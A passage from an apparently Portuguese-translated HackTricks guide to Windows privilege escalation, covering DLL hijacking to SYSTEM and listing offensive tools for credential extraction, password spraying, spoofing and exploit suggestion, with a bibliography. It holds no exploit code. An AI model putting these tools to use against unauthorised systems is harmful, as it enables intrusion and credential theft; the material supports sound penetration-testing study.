Se você conseguir **sequestrar uma dll** sendo **carregada** por um **processo** em execução como **SYSTEM**, você poderá executar código arbitrário com essas permissões. Portanto, o Dll Hijacking também é útil para esse tipo de escalonamento de privilégios e, além disso, é **muito mais fácil de alcançar a partir de um processo de alta integridade**, pois terá **permissões de gravação** nas pastas usadas para carregar dlls.\
**Você pode** [**saber mais sobre Dll hijacking aqui**](dll-hijacking/)**.**

### **From Administrator or Network Service to System**

{{#ref}}
https://github.com/sailay1996/RpcSsImpersonator
{{#endref}}

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Leia:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Melhor ferramenta para procurar vetores de escalonamento de privilégios locais do Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Verifique se há configurações incorretas e arquivos sensíveis (**[**verifique aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detectado.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Verifique se há algumas possíveis configurações incorretas e colete informações (**[**verifique aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Verifique se há configurações incorretas**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrai informações de sessão salvas do PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Use -Thorough em local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrai credenciais do Gerenciador de Credenciais. Detectado.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Pulveriza senhas coletadas pelo domínio**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh é uma ferramenta de spoofing e man-in-the-middle PowerShell ADIDNS/LLMNR/mDNS/NBNS.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumeração básica de privesc do Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Procura por vulnerabilidades conhecidas de privesc (DEPRECATED para Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Verificações locais **(Necessita de direitos de Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Procura por vulnerabilidades conhecidas de privesc (precisa ser compilado usando o VisualStudio) ([**pré-compilado**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera o host em busca de configurações incorretas (mais uma ferramenta de coleta de informações do que de privesc) (precisa ser compilado) **(**[**pré-compilado**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrai credenciais de muitos softwares (exe pré-compilado no github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Porta do PowerUp para C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Verifique se há configurações incorretas (executável pré-compilado no github). Não recomendado. Não funciona bem no Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Verifique se há possíveis configurações incorretas (exe do python). Não recomendado. Não funciona bem no Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Ferramenta criada com base neste post (não precisa do accesschk para funcionar corretamente, mas pode usá-lo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lê a saída do **systeminfo** e recomenda exploits funcionais (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lê a saída do **systeminfo** e recomenda exploits funcionais (python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Você deve compilar o projeto usando a versão correta do .NET ([veja isso](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Para ver a versão instalada do .NET no host da vítima, você pode fazer:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliografia

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)\\
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)\\
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

{{#include ../../banners/hacktricks-training.md}}
